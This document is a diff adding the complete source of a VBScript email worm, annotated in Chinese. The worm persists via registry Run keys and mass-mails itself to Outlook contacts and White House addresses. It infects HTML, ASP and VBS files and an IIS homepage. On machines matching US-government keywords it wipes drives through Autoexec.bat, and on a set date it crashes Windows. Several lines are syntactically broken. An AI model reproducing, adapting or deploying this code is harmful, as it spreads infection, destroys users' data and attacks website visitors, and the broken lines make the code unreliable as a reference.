@@ -1,0 +1,480 @@
+On Error Resume Next
+
+Dim vbscr, fso, w1, w2, MSWKEY, HCUW, Code_Str, Vbs_Str, Js_Str
+Dim defpath, smailc, MAX_SIZE
+Dim whb(), title(10)
+smailc = 4
+
+ReDim whb(smailc) ’白宫相关人员邮件名单
+
+whb(0) = "president@whitehouse.gov"
+whb(1) = "vice.president@whitehouse.gov "
+whb(2) = "first.lady@whitehouse.gov"
+whb(3) = "mrs.cheney@whitehouse.gov"
+'发送邮件的主题
+title(0) = "Thanks for helping me!"
+title(1) = "The police are investigating the robbery"
+title(2) = "an application for a job "
+title(3) = "The aspects of an application process pertinent to OSI"
+title(4) = "What a pleasant weather. Why not go out for a walk?"
+title(5) = "These countries have gone / been through too many wars"
+title(6) = "We've fixed on the 17th of April for the wedding"
+title(7) = "The wind failed and the sea returned to calmness."
+title(8) = "the sitting is open!"
+title(9) = ""
+defpath = "C:\Readme.html" ' 病毒文件
+MAX_SIZE = 100000 ' 定义传染文件的最大尺寸
+
+MSWKEY = "HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows\"
+HCUW = "HKEY_CURRENT_USER\Software\Microsoft\WAB\"
+
+
+main
+
+Sub main() '主程序
+    
+    On Error Resume Next
+    Dim w_s
+    w_s = WScript.ScriptFullName '得到病毒文件本身的路径
+    If w_s = "" Then
+        Err.Clear
+        Set fso = CreateObject("Scripting.FileSystemObject") '创建文件系统对象
+        
+        If getErr Then '辨认病毒状态
+            Randomize '初始化随机种子
+            ra = Int(Rnd() * 7) '产生随机数
+            doucment.Write title(ra) ' 写随机内容
+            ExecuteMail '执行邮件状态时的程序
+        Else
+            ExecutePage '执行 WEB 页状态时的程序
+        End If
+        
+    Else
+        ExecuteVbs '执行 VBS 文件状态时的程序
+    End If
+    
+End Sub
+
+
+Function getErr() '忽略错误
+    
+    If Err.Number<>0 Then
+        getErr = True
+        Err.Clear
+    Else
+        getErr = False
+    End If
+    
+End Function
+
+
+
+Sub ExecutePage() 'WEB 页状态时的程序
+    
+    On Error Resume Next
+    Dim Html_Str, adi, wdf, wdf2, wdf3, wdsf, wdsf2, vf
+    Vbs_Str = GetScriptCode("vbscript") '得到 VBScript 代码
+    Js_Str = GetJavaScript() ' 得到 Javascript 代码
+    Code_Str = MakeScript(encrypt(Vbs_str), True) '得到已加密过的脚本代码
+    Html_Str = MakeHtml(encrypt(Vbs_str), True) '得到已加密的完整HTML代码
+    
+    Gf
+    
+    '定义病毒文件的路径
+    wdsf = w2 & "Mdm.vbs"
+    wdsf2 = w1 & "Profile.vbs"
+    wdf = w2 & "user.dll" ' 注意 wdf 和 wdf3 两个文件非常迷惑人
+    wdf2 = w2 & "Readme.html"
+    wdf3 = w2 & "system.dll"
+    '创建病毒文件
+    Set vf = fso.OpenTextFile (wdf, 2, True)
+    vf.Write Vbs_Str
+    vf.Close
+    
+    Set vf = fso.OpenTextFile (wdsf, 2, True)
+    vf.Write Vbs_Str
+    vf.Close
+    
+    Set vf = fso.OpenTextFile (wdsf2, 2, True)
+    vf.Write Vbs_Str
+    vf.Close
+    
+    Set vf = fso.OpenTextFile (wdf2, 2, True)
+    vf.Write Html_Str
+    vf.Close
+    Set vf = fso.OpenTextFile (wdf3, 2, True)
+    vf.Write Code_Str
+    vf.Close
+    
+    
+    
+    '修改注册表，让病毒文件在每一次计算机启动自动执行
+    Writereg MSWKEY & "CurrentVersion\Run\Mdm", wdsf, ""
+    Writereg MSWKEY & "CurrentVersion\RunServices\Profile", wdsf2, ""
+    
+    SendMail ' 执行发送邮件程序
+    Hackpage ' 执行感染网站程序
+    
+    
+    Set adi = fso.Drives
+    For Each x in adi
+        If x.DrivesType = 2 Or x.DrivesType = 3 Then '遍历所有本地硬盘和网络共享硬盘
+            Call SearchHTML(x & "\") '执行文件感染程序
+        End If
+        
+    Next
+    
+    If TestUser Then '检查用户
+        Killhe 执行删除文件操作
+    Else
+        If Month(Date) & Day(Date) = "75" Then '如系统时间为 7月5日
+            Set vf = fso.OpenTextFile(w2 & "75.htm", 2, True) ’创建系统攻击文件
+            vf.Write MakeScript ("window.navigate ('c:/con/con');", False)
+            vf.Close
+            Writereg MSWKEY & "CurrentVersion\Run\75", w2 & "75.htm", "" '自动启动
+            window.navigate "c:/con/con" '立刻蓝屏，利用 Windows BUG，能引起 Win9X 系统100%死机（即无法恢复的蓝屏）
+        Else '如不是7.5
+            If fso.FileExists(w2 & "75.htm") Then fso.DeleteFile w2 & "75.htm" ' 删除75.htm
+        End If
+    End If
+    
+    If fso.FileExists(defpath) Then fso.DeleteFile defpath ' 删除 C:\Readme.html 病毒文件
+    
+End Sub
+
+
+
+
+
+
+Sub ExecuteMail() '邮件状态时执行的程序
+    
+    On Error Resume Next
+    Vbs_Str = GetScriptCode("vbscript")
+    Js_Str = GetJavaScript()
+    Set Stl = CreateObject("Scriptlet.TypeLib") '创建 TypeLib对象
+    With Stl
+        .Reset
+        .Path = defpath
+        .Doc = MakeHtml(encrypt(Vbs_str), True)
+        .Write() '创建 C:\Readme.html 文件
+    End With
+    window.Open defpath, "trap", "width=1 height=1 menubar=no scrollbars=no toolbar=no" 打开会隐藏的窗口
+End Sub
+
+
+Sub ExecuteVbs() ' 同理，如病毒文件是 VBS 时所执行的程序
+    
+    On Error Resume Next
+    Dim x, adi, wvbs, ws, vf
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set wvbs = CreateObject("WScript.Shell")
+    
+    Gf
+    
+    wvbs.RegWrite MSWKEY & "Windows Scripting Host\Setings\Timeout", 0, "REG_DWORD"
+    Set vf = fso.OpenTextFile (w2 & "system.dll", 1)
+    Code_Str = vf.ReadAll()
+    vf.Close
+    Hackpage
+    SendMail
+    Set adi = fso.Drives
+    For Each x in adi
+        If x.DrivesType = 2 Or x.DrivesType = 3 Then
+            Call SearchHTML(x & "\")
+        End If
+    Next
+    
+    If TestUser Then Killhe
+    
+End Sub
+
+
+
+
+
+
+Sub Gf() '得到系统路径
+    
+    w1 = fso.GetSpecialFolder(0) & "\"
+    w2 = fso.GetSpecialFolder(1) & "\"
+    
+End Sub
+
+
+
+Function Readreg(key_str) '读注册表
+    Set tmps = CreateObject("WScript.Shell")
+    Readreg = tmps.RegRead(key_str)
+    Set tmps = Nothing
+End Function
+
+
+Function Writereg(key_str, Newvalue, vtype) '写注册表
+    Set tmps = CreateObject("WScript.Shell")
+    If vtype = "" Then
+        tmps.RegWrite key_str, Newvalue
+    Else
+        tmps.RegWrite key_str, Newvalue, vtype
+    End If
+    Set tmps = Nothing
+End Function
+
+
+Function MakeHtml(Sbuffer, iHTML) '创建HTML 文件的完整代码
+    Dim ra
+    Randomize
+    ra = Int(Rnd() * 7)
+    MakeHtml = "<" & "HTML><" & "HEAD><" & "TITLE>" & title(ra) & "</" & "TITLE><" & "/HEAD>" & _
+               "<BO" & "AD>" & vbCrLf & MakeScript(Sbuffer, iHTML) & vbCrLf & _
+               "<" & "/BOAD><" & "/HTML>"
+End Function
+
+
+
+Function MakeScript(Codestr, iHTML) '此程序是病毒进行自我加密过程,较为复杂，不再描述
+    
+    If iHTML Then
+        Dim DocuWrite
+        DocuWrite = "document.write('<'+" & "'SCRIPT Language=JavaScript>\n'+" & _
+                    "jword" & "+'\n</'" & "+'SCRIPT>');"
+        DocuWrite = DocuWrite & vbCrLf & "document.write('<'+" & "'SCRIPT Language=VBScript>\n'+" & _
+                    "nword" & "+'\n</'" & "+'SCRIPT>');"
+        MakeScript = "<" & "SCRIPT Language=JavaScript>" & vbCrLf & "var jword = " & _
+                     Chr(34) & encrypt(Js_Str) & Chr(34) & vbCrLf & "var nword = " & _
+                     Chr(34) & Codestr & Chr(34) & vbCrLf & "nword = unescape(nword);" & vbCrLf & _
+                     "jword = unescape(jword);" & vbCrLf & DocuWrite & vbCrLf & "</" & "SCRIPT>"
+    Else
+        MakeScript = "<" & "SCRIPT Language=JavaScript>" & Codestr & "</" & "SCRIPT>"
+    End If
+End Function
+
+
+Function GetScriptCode(Languages) ' 得到不同脚本语言的代码
+    
+    Dim soj
+    For Each soj in document.scripts
+        If LCase(soj.Language) = Languages Then
+            
+            If Languages = "javascript" Then
+                
+                If Len(soj.Text)> 200 Then
+                Else
+                    GetScriptCode = soj.Text
+                    Exit Function
+                End If
+                
+            Else
+                GetScriptCode = soj.Text
+                Exit Function
+            End If
+            
+        End If
+    Next
+    
+End Function
+
+
+
+
+
+
+Function GetJavaScript()
+    
+    GetJavaScript = GetScriptCode("javascript")
+End Function
+
+
+
+
+
+
+Function TestUser() '检测用户过程
+    
+    On Error Resume Next
+    Dim Keys(6), i, tmpStr, Wnet
+    '特定用户关键词
+    Keys(0) = "white home"
+    Keys(1) = "central intelligence agency"
+    Keys(2) = "bush"
+    Keys(3) = "american stock exchang"
+    Keys(4) = "chief executive"
+    Keys(5) = "usa"
+    TestUser = False
+    Set Wnet = CreateObject("WScript.Network") '创建网络对象
+    '下面一共3个循环，作用一样，是检查用户的 Domain、用户名和计算机名是否含有以上的5个关键词语，一旦含有程序将返回”真”的条件，从而对这些用户的文件进行疯狂删除。
+    
+    tmpStr = LCase(Wnet.UserName) '
+    For i = 0 To 4
+        If InStr(tmpStr, Keys(i)) > 0 Then
+            TestUser = True
+            Exit Function
+        End If
+    Next
+    tmpStr = LCase(Wnet.ComputerName)
+    For i = 0 To 4
+        If InStr(tmpStr, Keys(i)) > 0 Then
+            TestUser = True
+            Exit Function
+        End If
+    Next
+    tmpStr = LCase(Wnet.UserDomain)
+    For i = 0 To 4
+        If InStr(tmpStr, Keys(i)) >0 Then
+            TestUser = True
+            Exit Function
+        End If
+    Next
+    Set Wnet = Nothing
+End Function
+
+
+
+Function SendMail() '发送文件过程
+    
+    On Error Resume Next
+    Dim wab, ra, j, Oa, arrsm, eins, Eaec, fm, wreg, areg, at
+    '首先向 OutLook 地址簿发送带能直接感染文件的已加密的病毒代码和HTML 附件
+    主题是随机的，此过程与“欢乐时光“类似，所以不再描述
+    Randomize
+    at = fso.GetSpecialFolder(1) & "\Readme.html"
+    Set Oa = CreateObject("Outlook.Application")
+    Set wab = Oa.GetNameSpace("MAPI")
+    For j = 1 To wab.AddressLists.Count
+        eins = wab.AddressLists(j)
+        wreg = Readreg (HCUW & eins)
+        If (wreg = "") Then wreg = 1
+        Eaec = eins.AddressEntries.Count
+        If (Eaec > Int(wreg)) Then
+            For x = 1 To Eaec
+                arrsm = wab.AddressEntries(x)
+                areg = Readreg(HCUW & arrsm)
+                If (areg = "") Then
+                    Set fm = wab.CreateItem(0)
+                    With fm
+                        ra = Int(Rnd() * 7)
+                        .Recipients.Add arrsm
+                        .Subject = title(ra)
+                        .Body = title(ra)
+                        .Attachments at
+                        .Send
+                        Writereg HCUW & arrsm, 1, "REG_DWORD"
+                    End With
+                End If
+            Next
+        End If
+        Writereg HCUW & eins, Eaec, ""
+    Next
+    '下面是对指定的用户无条件发送大量病毒邮件, 从这一点可看出病毒作者对美国政府的极度不满。
+    For j = 1 To smailc
+        arrsm = whb(j)
+        Set fm = wab.CreateItem(0)
+        ra = Int(Rnd() * 7)
+        With fm
+            .Recipients.Add arrsm
+            .Subject = title(ra)
+            .Body = title(ra)
+            .Send
+        End With
+    Next
+    Set Oa = Nothing
+    window.setTimeout "SendMail()", 5000 '每隔 5 秒种重复发送
+End Function
+
+
+Sub SearchHTML(Path) '搜索可传染文件的过程
+    On Error Resume Next
+    Dim pfo, psfo, pf, ps, pfi, ext
+    If InStr(Path, fso.GetSpecialFolder(2)) > 0 Then Exit Sub
+    If Path <> "E:\" Then Exit Sub
+    Set pfo = fso.GetFolder(Path)
+    Set psfo = pfo.SubFolders
+    For Each ps in psfo
+        SearchHTML(ps.Path)
+        Set pf = ps.Files
+        For Each pfi in pf
+            ext = LCase(fso.GetExtensionName(pfi.Path))
+            If InStr(ext, "htm") > 0 Or ext = "plg" Or ext = "asp" Then '检查文件的扩展名是否为 htm、html、plg 如是则检查是否被感染，如未被感染则将已加密的病毒代码插入文件头，这样文件一旦执行也会执行病毒代码，而且不会影响原文件的正常执行。
+                If Code_Str<>"" Then AddHead pfi.Path, pfi, 1
+            ElseIf ext = "vbs" Then '如是 vbs 文件，则插入未加密的病毒代码
+                AddHead pfi.Path, pfi, 2
+            End If
+        Next
+    Next
+End Sub
+
+
+
+
+
+
+Sub Killhe() '全盘删除文件过程
+    
+    On Error Resume Next
+    Dim codeText, ko, adi, kd, kh, ks, kf, kfs
+    codeText = "@ECHO OFF" & vbCrLf & "PATH " & w1 & "COMMAND" & vbCrLf &_
+    "DELTREE c:\" '将删除C盘的命令插入Autoexec.bat 中，下次开机时，删除整个硬盘，并没有任何提示
+    Set ko = fso.OpenTextFile("C:\Autoexec.bat", 8, True)
+    ko.Write vbCrLf & codeText
+    ko.Close
+    '接着立刻删除其它盘的所有文件
+    Set adi = fso.Drives
+    For Each x in adi
+        If x.DrivesType = 2 Then
+            Set kd = fso.GetFolder(x & "\")
+            Set kfs = kd.Files
+            For Each kf in kfs
+                kf.Delete
+            Next
+            Set ks = kd.SubFolders
+            For Each kh in ks
+                kh.Delete
+            Next
+        End If
+    Next
+    
+    Do While 1 '让系统立刻死机
+        window.Open ""
+    Loop
+End Sub
+
+Sub Hackpage() ' 此过程是直接攻击 Mircosoft IIS 服务器主页过程
+    
+    Dim fi
+    H = "C:\InetPut\wwwroot"
+    If fso.FolderExists(H) Then
+        '判断是否为网站，如是则将已加密的带病毒代码插入文件头，从而直接传染浏览该网站的用户
+        Set fi = fso.GetFile(H & "\index.htm")
+        AddHead H & "\index.htm", fi, 1
+    End If
+    
+End Sub
+
+Sub AddHead(Path, f, t) '此过程是病毒传染文件具体过程
+    
+    On Error Resume Next
+    Dim tso, buffer, sr
+    If f.Size > MAX_SIZE Then Exit Sub '传染大小小于100K的文件
+    Set tso = fso.OpenTextFile(Path, 1, True)
+    buffer = tso.ReadAll()
+    tso.Close
+    If (t = 1) Then
+        
+        If UCase(Left(LTrim(buffer), 7)) <> "<SCRIPT" Then
+            
+            Set tso = fso.OpenTextFile(Path, 2, True)
+            tso.Write Code_Str & vbCrLf & buffer '插入到文件头
+            tso.Close
+            
+        End If
+    Else
+        If Mid(buffer, 3, 2) <> "'@" Then
+            
+            tso.Close
+            sr = w2 & "user.dll"
+            If fso.FileExists(sr) Then fso.CopyFile sr, Path
+        End If
+    End If
+End If
+
+End Sub
